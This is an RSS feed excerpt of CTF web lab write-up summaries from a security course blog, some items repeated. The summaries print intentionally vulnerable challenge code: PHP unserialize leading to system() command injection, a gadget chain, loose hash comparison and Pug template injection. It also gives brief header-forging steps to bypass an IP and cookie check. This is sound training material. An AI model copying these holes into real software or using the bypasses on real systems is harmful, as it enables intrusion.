+0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/index.html</guid><description>Simple Web 0x17(Lab - Baby Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8601/
Background 0x16.5(php unserialize)
Source code :::spoiler code
&lt;?php isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Cat { public $name = '(guest cat)'; function __construct($name) { $this->name = $name; } function __wakeup() { echo "&lt;pre>"; system("cowsay 'Welcome back, $this->name'"); echo "&lt;/pre>"; } } if (!isset($_COOKIE['cat_session'])) { $cat = new Cat("cat_" . rand(0, 0xffff)); setcookie('cat_session', base64_encode(serialize($cat))); } else { $cat = unserialize(base64_decode($_COOKIE['cat_session'])); } ?> &lt;p>Hello, &lt;?= $cat->name ?>.&lt;/p> &lt;a href="https://bernie6401.github.io/?source">source code&lt;/a> :::</description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/index.html</guid><description>Simple Web 0x17(Lab - Baby Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8601/
Background 0x16.5(php unserialize)
Source code :::spoiler code
&lt;?php isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Cat { public $name = '(guest cat)'; function __construct($name) { $this->name = $name; } function __wakeup() { echo "&lt;pre>"; system("cowsay 'Welcome back, $this->name'"); echo "&lt;/pre>"; } } if (!isset($_COOKIE['cat_session'])) { $cat = new Cat("cat_" . rand(0, 0xffff)); setcookie('cat_session', base64_encode(serialize($cat))); } else { $cat = unserialize(base64_decode($_COOKIE['cat_session'])); } ?> &lt;p>Hello, &lt;?= $cat->name ?>.&lt;/p> &lt;a href="https://bernie6401.github.io/?source">source code&lt;/a> :::</description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/index.html</guid><description>Simple Web 0x18(Lab - Magic Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8602/
Background None…
Source code :::spoiler code
isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Magic { function cast($spell) { echo "&lt;script>alert('MAGIC, $spell!');&lt;/script>"; } } // Useless class? class Caster { public $cast_func = 'intval'; function cast($val) { return ($this->cast_func)($val); } } class Cat { public $magic; public $spell; function __construct($spell) { $this->magic = new Magic(); $this->spell = $spell; } function __wakeup() { echo "Cat Wakeup!\n"; $this->magic->cast($this->spell); } } if (isset($_GET['spell'])) { $cat = new Cat($_GET['spell']); } else if (isset($_COOKIE['cat'])) { echo "Unserialize...\n"; $cat = unserialize(base64_decode($_COOKIE['cat'])); } else { $cat = new Cat("meow-meow-magic"); } ?> &lt;pre> This is your 🐱: &lt;?php var_dump($cat) ?> &lt;/pre> &lt;p>Usage:&lt;/p> &lt;p>/?source&lt;/p> &lt;p>/?spell=the-spell-of-your-cat&lt;/p> :::</description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/index.html</guid><description>Simple Web 0x18(Lab - Magic Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8602/
Background None…
Source code :::spoiler code
isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Magic { function cast($spell) { echo "&lt;script>alert('MAGIC, $spell!');&lt;/script>"; } } // Useless class? class Caster { public $cast_func = 'intval'; function cast($val) { return ($this->cast_func)($val); } } class Cat { public $magic; public $spell; function __construct($spell) { $this->magic = new Magic(); $this->spell = $spell; } function __wakeup() { echo "Cat Wakeup!\n"; $this->magic->cast($this->spell); } } if (isset($_GET['spell'])) { $cat = new Cat($_GET['spell']); } else if (isset($_COOKIE['cat'])) { echo "Unserialize...\n"; $cat = unserialize(base64_decode($_COOKIE['cat'])); } else { $cat = new Cat("meow-meow-magic"); } ?> &lt;pre> This is your 🐱: &lt;?php var_dump($cat) ?> &lt;/pre> &lt;p>Usage:&lt;/p> &lt;p>/?source&lt;/p> &lt;p>/?spell=the-spell-of-your-cat&lt;/p> :::</description></item><item><title>Simple Web 0x19(Lab - PHP Login)</title><link>https://bernie6401.github.io/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/index.html</guid><description>Simple Web 0x19(Lab - PHP Login) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8081
Background Source code &lt;?php // BSides Ahmedabad CTF 2021: entrance include 'flag.php'; $users = array( "admin" => "ed2b7b57b3b5be3e8d4246c69e4b513608ffb352", "guest" => "35675e68f4b5af7b995d9205ad0fc43842f16450" ); function lookup($username) { global $users; return array_key_exists($username, $users) ? $users[$username] : ""; } if (!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) { $sha1pass = lookup($_POST['username']); if ($sha1pass == sha1($_POST['password'])) { if ($_POST['username'] !== 'guest') echo $FLAG; else echo 'Welcome guest!'; } else { echo 'Login Failed!'; } } else { echo "You can login with guest:guest"; } echo "&lt;br>\n"; highlight_file(__file__); ?> Exploit Must change GET method to POST method and add Content-Type: application/x-www-form-urlencoded in header</description></item><item><title>Simple Web 0x22(Lab - Pug)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/index.html</guid><description>Simple Web 0x22(Lab - Pug) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8008
Source code :::spoiler
const express = require('express'); const pug = require('pug'); const app = express(); const template = ` h1 Hello %NAME% form(method='GET' action='https://bernie6401.github.io/') div label(for='nickname') Name: input#nickname(type='text', placeholder='Nickname' name='name') button(type='submit') Submit a(href='https://bernie6401.github.io/source') Source Code `; app.get('/', (req, res) => { const name = (req.query.name ?? 'Anonymous').toString(); if (name.includes('{')) return res.send('Nice try'); let html = pug.render(template.replace('%NAME%', name)); res.set('Content-Type', 'text/html'); res.send(html); }); app.get("/source", (_, res) => { res.sendFile(__filename); }); app.listen(3000, () => console.log(':3000')); :::</description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x14lab---xxe/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x14lab---xxe/index.html</guid><description>Simple Web 0x23(Lab - XXE) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8604/
Background XML Tree XML Parser AJAX - Server Response XML DTD
输入流 php://input
php://input可以读取没有处理过的POST数据。
Day 18：Stream 概述
php://input 取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。
來自外部的威脅-XXE漏洞攻擊成因 :::spoiler XXE course lecture ::: :::spoiler exploit type</description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/index.html</guid><description>Simple Web 0x23(Lab - XXE) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8604/
Background XML Tree XML Parser AJAX - Server Response XML DTD
输入流 php://input
php://input可以读取没有处理过的POST数据。
Day 18：Stream 概述
php://input 取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。
來自外部的威脅-XXE漏洞攻擊成因 :::spoiler XXE course lecture ::: :::spoiler exploit type</description></item><item><title>Simple Web 0x24(Lab - how2http)</title><link>https://bernie6401.github.io/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/index.html</guid><description>Simple Web 0x24(Lab - how2http) Source code &lt;?php show_source(__FILE__); include("flag.php"); if (!empty($_SERVER["HTTP_CLIENT_IP"])){ $ip = $_SERVER["HTTP_CLIENT_IP"]; } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){ $ip = $_SERVER["HTTP_X_FORWARDED_FOR"]; } else { $ip = $_SERVER["REMOTE_ADDR"]; } if ($_COOKIE['user'] !== 'admin') die("Not admim"); if( $_SERVER["REQUEST_METHOD"] !== "FLAG" ) die("u don't need flag?"); if ($ip === "127.0.0.1") echo $FLAG; else echo "NOPE!"; ?> Recon 主要是參考之前寫過的PicoCTF - Who are you?和PicoCTF - Who are you?，按照source code我們需要更改一些header讓他可以被forge然後bypass這些條件，首先是IP，他其實給的很寬鬆，還有X-Forwarded-For的header可以用，就直接==X-Forwarded-For: 127.0.0.1==；另外，cookie的user要等於admin→==Cookie: user=admin==；再來，request method要等於FLAG→==FLAG / HTTP/1.1==
Exploit</description></item></channel></rss>